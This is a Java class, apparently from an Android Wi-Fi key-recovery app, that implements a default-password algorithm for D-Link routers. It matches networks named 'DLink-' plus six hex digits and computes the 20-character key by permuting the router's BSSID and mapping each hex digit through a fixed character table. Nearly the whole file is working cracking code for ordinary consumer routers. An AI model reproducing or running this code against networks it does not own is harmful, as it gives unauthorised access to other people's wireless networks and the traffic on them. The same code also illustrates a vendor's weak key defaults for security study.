package es.pulimento.wifi.core.algorithms;

import es.pulimento.wifi.core.WirelessEncryption;
import android.util.Log;


public class DlinkAlgorithm extends CrackAlgorithm {

	/*
	 * D-Link algorithm.
	 * 
	 * TODO: Description and supported routers.
	 */

	// TODO: Add encryption and clean all up...
	public static WirelessEncryption[] encryption = {  };

	@Override
	protected void setPatterns() {

		// ESSID: Dlink-XXXXXX
		// BSSID: Any
		addPattern("DLink-[0-9a-fA-F]{6}", "*");
	}

	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		bssid_data = bssid_data.replace(":","").toUpperCase();
		return crackDLink(bssid_data);
	}

	public static String crackDLink(String BSSID){
		char hash[] = { 'X', 'r', 'q', 'a', 'H', 'N',
	 			'p', 'd', 'S', 'Y', 'w', 
	 			'8', '6', '2', '1', '5'};
		//Log.e("pulWifi","Bssid pasado por parámetro -> "+BSSID);
		char[] key = new char[20];
		String mac = BSSID;
		key[0]=mac.charAt(11);
		key[1]=mac.charAt(0);		 
		key[2]=mac.charAt(10);
		key[3]=mac.charAt(1);		
		key[4]=mac.charAt(9);
		key[5]=mac.charAt(2);		 
		key[6]=mac.charAt(8);
		key[7]=mac.charAt(3);		
		key[8]=mac.charAt(7);
		key[9]=mac.charAt(4);		
		key[10]=mac.charAt(6);
		key[11]=mac.charAt(5);		
		key[12]=mac.charAt(1);
		key[13]=mac.charAt(6);		
		key[14]=mac.charAt(8);
		key[15]=mac.charAt(9);		
		key[16]=mac.charAt(11);
		key[17]=mac.charAt(2);		
		key[18]=mac.charAt(4);
		key[19]=mac.charAt(10);
		char [] newkey = new char[20];
		char t;
		int index = 0;
		for (int i=0; i < 20 ; i++){
			t=key[i];
			if ((t >= '0') && (t <= '9'))index = t-'0';
			else{
				t=Character.toUpperCase(t);
				if ((t >= 'A') && (t <= 'F'))
					index = t-'A'+10;
				else{
					Log.e("pulWifi","Mierda pa mi (crack_dLink)");
					//return null;
				}
			}
			newkey[i]=hash[index];
		}
		return String.valueOf(newkey, 0, 20);
	}	
}
